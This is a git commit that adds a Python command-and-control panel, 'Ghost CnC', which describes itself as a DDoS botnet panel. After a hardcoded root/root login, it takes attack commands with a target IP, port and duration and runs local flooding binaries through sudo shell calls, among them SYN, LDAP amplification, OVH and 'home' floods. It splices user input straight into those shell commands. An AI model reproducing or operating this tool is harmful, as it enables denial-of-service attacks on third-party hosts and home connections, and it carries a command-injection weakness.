576380958fe8d61b385c9e3de04e7256f442e583
vksoz <130881790+vksoz@users.noreply.github.com>
2023-04-15 23:06:56 -0400

    Add files via upload

---
+++ home-holder.py
@@ -0,0 +1,290 @@
+# # # # # # # # # # # # # # # # # # # # #
+# Updated CNC With New Colors/Methods   #
+# Make Sure To follow me @secure.js     #
+# Don't skid the panel pls I worked hard#
+# Less Go                               #
+# # # # # # # # # # # # # # # # # # # # #
+import socket
+import os
+import random
+import getpass
+import time
+import sys
+import datetime
+from datetime import date
+
+now = datetime.datetime.now()
+
+today = date.today()
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+proxys = open('proxies.txt').readlines()
+bots = len(proxys)
+
+def ascii_vro():
+    clear()
+    print(f'''
+                  (\__.-. |
+                  == ===_]+
+                          |
+ ` - .
+       ` - >->
+
+
+      ....           ....           ....           ....
+     ||             ||             ||             ||
+ /"""l|\        /"""l|\        /"""l|\        /"""l|\\
+/_______\      /_______\      /_______\      /_______\\
+|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
+ __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
+_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
+------------------------------------------------------------
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+                     (\__.-. |
+                     == ===_]+
+                             |
+ ` - .
+       ` - .
+            >->
+
+
+      ....           ....           ....           ....
+     ||             ||             ||             ||
+ /"""l|\        /"""l|\        /"""l|\        /"""l|\\
+/_______\      /_______\      /_______\      /_______\\
+|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
+ __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
+_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
+------------------------------------------------------------
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+                         (\__.-. |
+                         == ===_]+
+                                 |
+ ` - .
+       ` - .
+            - 
+              ` >->
+
+      ....           ....           ....           ....
+     ||             ||             ||             ||
+ /"""l|\        /"""l|\        /"""l|\        /"""l|\\
+/_______\      /_______\      /_______\      /_______\\
+|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
+ __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
+_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
+------------------------------------------------------------
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+                              (\__.-. |
+                              == ===_]+
+                                      |
+ ` - .
+       ` - .
+            - 
+              `
+                - >->
+      ....           ....           ....           ....
+     ||             ||             ||             ||
+ /"""l|\        /"""l|\        /"""l|\        /"""l|\\
+/_______\      /_______\      /_______\      /_______\\
+|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
+ __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
+_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
+------------------------------------------------------------
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+                              (\__.-. |
+                              == ===_]+
+                                      |
+ ` - .
+       ` - .
+            - 
+              `
+                - 
+      ....       `   ....           ....           ....
+     ||          >-> ||             ||             ||
+ /"""l|\        /"""l|\        /"""l|\        /"""l|\\
+/_______\      /_______\      /_______\      /_______\\
+|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
+ __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
+_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
+------------------------------------------------------------
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f"""
+
+     _.-^^---....,,--       
+ _--                  --_  
+<                        >)
+|                         | 
+ \._                   _./  
+    ```--. . , ; .--'''       
+          | |   |             
+       .-=||  | |=-.   
+       `-=#$%&%$#=-'   
+          | ;  :|     
+ _____.,-#%&$@%#&#~,._____
+    """)
+    time.sleep(0.8)
+    clear()
+
+def si():
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mGhost \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Ghost CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mInstagram: secure.js \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
+    print("")
+
+def home():
+	clear()
+	si()
+	print(f'''
+                              \x1b[38;2;255;23;202m╔═══════════════╗
+                              \x1b[38;2;255;23;202m║    \x1b[38;2;0;255;255mHome-God    \x1b[38;2;255;23;202m║
+               \x1b[38;2;255;23;202m╔══════════════╩════════╦══════╩══════════════╗
+               \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255mhome-hold           \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255mldap              \x1b[38;2;255;23;202m║
+               \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255mhome-god            \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255mx-std             \x1b[38;2;255;23;202m║
+               \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255mstd                 \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255mrail              \x1b[38;2;255;23;202m║
+               \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255mhaven-god           \x1b[38;2;255;23;202m║   \x1b[38;2;215;11;255msyn               \x1b[38;2;255;23;202m║
+               \x1b[38;2;255;23;202m╚═══════════════════════╩═════════════════════╝
+		''')
+
+def menu():
+    sys.stdout.write(f"\x1b]2;Ghost Net --> Bots: [{bots}] | Online Users: [1] | Methods: [8] | Expiry: [Lifetime]\x07")
+    clear()
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mGhost \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Ghost CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mInstagram: secure.js \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
+    print("")
+    print("""
+                           \x1b[38;2;255;23;202m╔═╗ \x1b[38;2;215;11;255m  ╦ \x1b[38;2;244;77;255m╦   ╔═╗ \x1b[38;2;185;43;255m ╔═╗ \x1b[38;2;111;0;255m ╔╦╗ 
+                           \x1b[38;2;255;23;202m║ ╦ \x1b[38;2;215;11;255m  ╠═\x1b[38;2;244;77;255m╣   ║ ║ \x1b[38;2;185;43;255m ╚═╗ \x1b[38;2;111;0;255m  ║  
+                           \x1b[38;2;255;23;202m╚═╝ \x1b[38;2;215;11;255m  ╩ \x1b[38;2;244;77;255m╩   ╩═╝ \x1b[38;2;185;43;255m ╩═╝ \x1b[38;2;111;0;255m  ╩  
+                \x1b[38;2;255;23;202m╔═══════════\x1b[38;2;215;11;255m════════\x1b[38;2;244;77;255m═══════\x1b[38;2;185;43;255m═════\x1b[38;2;111;0;255m═════\x1b[38;2;0;255;68m══════════╗
+                \x1b[38;2;255;23;202m║       \x1b[38;2;239;239;239mWelcome to Ghost Net DDoS Panel        \x1b[38;2;0;255;68m║
+                \x1b[38;2;255;23;202m║ \x1b[38;2;0;49;147m- - -   \x1b[38;2;239;239;239mThe best botnet on the com  \x1b[38;2;0;212;14m- - -    \x1b[38;2;0;255;68m║
+                \x1b[38;2;255;23;202m╚═══════════\x1b[38;2;215;11;255m════════\x1b[38;2;244;77;255m═══════\x1b[38;2;185;43;255m═════\x1b[38;2;111;0;255m═════\x1b[38;2;0;255;68m══════════╝
+                    \x1b[38;2;255;23;202m╔═══════\x1b[38;2;153;51;255m════════\x1b[38;2;244;77;255m═══════\x1b[38;2;185;43;255m═════\x1b[38;2;111;0;255m═════\x1b[38;2;0;255;68m══════╗
+                    \x1b[38;2;255;23;202m║  \x1b[38;2;239;239;239mhttps://instagram.com/secure.js/  \x1b[38;2;0;255;68m  ║
+                    \x1b[38;2;255;23;202m╚═══════\x1b[38;2;153;51;255m════════\x1b[38;2;244;77;255m═══════\x1b[38;2;185;43;255m═════\x1b[38;2;111;0;255m═════\x1b[38;2;0;255;68m══════╝
+                \x1b[38;2;255;23;202m╔═══════════\x1b[38;2;153;51;255m════════\x1b[38;2;244;77;255m═══════\x1b[38;2;185;43;255m═════\x1b[38;2;111;0;255m═════\x1b[38;2;0;255;68m══════════╗
+                \x1b[38;2;255;23;202m║   \x1b[38;2;239;239;239mType [home] to see the ghost methods.      \x1b[38;2;0;255;68m║
+                \x1b[38;2;255;23;202m╚═══════════\x1b[38;2;153;51;255m════════\x1b[38;2;244;77;255m═══════\x1b[38;2;185;43;255m═════\x1b[38;2;111;0;255m═════\x1b[38;2;0;255;68m══════════╝
+""")
+def main():
+    menu()
+    while(True):
+        cnc = input('''\x1b[38;2;255;23;202m╔══[root\x1b[38;2;153;51;255m@G\x1b[38;2;244;77;255mho\x1b[38;2;185;43;255mst\x1b[38;2;111;0;255m\x1b[38;2;0;255;68m
+\x1b[38;2;255;23;202m╚\x1b[38;2;153;51;255m═\x1b[38;2;244;77;255m═\x1b[38;2;185;43;255m═\x1b[38;2;111;0;255m═\x1b[38;2;0;255;68m➤ \x1b[38;2;239;239;239m''')
+        if cnc == "home" or cnc == "HOME":
+        	home()
+       	elif cnc == "back" or cnc == "BACK":
+       		ascii_vro()
+       		time.sleep(0.5)
+       		main()
+       	elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+            main()
+       	elif 'home-hold' in cnc:
+       		try:
+       			ip = cnc.split()[1]
+       			port = cnc.split()[2]
+       			time = cnc.split()[3]
+       			os.system(f'sudo ./HOME-HOLD {ip} {port} {time}')
+       		except IndexError:
+       			print("Usage: home-hold <ip> <port> <time>")
+       			print("Example: home-hold 1.1.1.1 80 75")
+       	elif 'home-god' in cnc:
+       		try:
+       			ip = cnc.split()[1]
+       			port = cnc.split()[2]
+       			os.system(f'sudo ./OVH-AMP {ip} {port}')
+       		except IndexError:
+       			print("Usage: home-god <ip> <port>")
+       			print("Example: home-god 1.1.1.1 80")
+       	elif 'std' in cnc:
+       		try:
+       			ip = cnc.split()[1]
+       			port = cnc.split()[2]
+       			os.system(f'sudo ./STD {ip} {port}')
+       		except IndexError:
+       			print("Usage: std <ip> <port>")
+       			print("Example: std 1.1.1.1 80")
+       	elif 'haven-god' in cnc:
+            try:
+                ip = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'sudo ./haven -d {ip} -t {time} -z 130')
+            except IndexError:
+                print(f'Usage: haven-god <ip> <time>')
+                print(f'Example: haven-god 192.168.0.1 30')
+        elif 'ldap' in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                threads = cnc.split()[3]
+                pps = cnc.split()[4]
+                time = cnc.split()[5]
+                os.system(f'sudo ./ldapv2 {ip} {port} ldaplist.txt {threads} {pps} {time}')
+            except IndexError:
+                print(f'Usage: ldap <ip> <port> <threads> <pps> <time>')
+                print(f'Example: ldap 1.1.1.1 8739 15 1024 50')
+        elif 'x-std' in cnc:
+        	try:
+        		ip = cnc.split()[1]
+        		port = cnc.split()[2]
+        		os.system(f'sudo ./X-STD {ip} {port}')
+        	except IndexError:
+        		print("Usage: x-std <ip> <time>")
+        		print("Example: x-std 192.168.0.1 30")
+        elif "rail" in cnc:
+        	try:
+        		ip = cnc.split()[1]
+        		port = cnc.split()[2]
+        		time = cnc.split()[3]
+        		os.system(f'sudo ./rail {ip} {port} {time}')
+        	except IndexError:
+        		print("Usage: rail <ip> <port> <time>")
+        		print("Example: rail 1.1.1.1 80 60")
+        elif "syn" in cnc:
+        	try:
+        		ip = cnc.split()[1]
+        		port = cnc.split()[2]
+        		time = cnc.split()[3]
+        		os.system(f'sudo ./syn {ip} {port} {time}')
+        	except IndexError:
+        		print("Usage: syn <ip> <port> <time>")
+        		print("Example: syn 1.1.1.1 80 60")
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+            	pass
+
+
+def login():
+    clear()
+    user = "root"
+    passwd = "root"
+    username = input("</> \033[mUsername:\x1b[38;2;255;196;0m ")
+    password = getpass.getpass(prompt='\033[m</> Password:\x1b[38;2;255;196;0m ')
+    if username != user or password != passwd:
+        print("")
+        print("</> Invalid credentials! Abandoning...")
+        sys.exit(1)
+    elif username == user and password == passwd:
+        print("\033[m</> Welcome to Ghost CnC!")
+        time.sleep(0.3)
+        ascii_vro()
+        main()
+
+login()
+
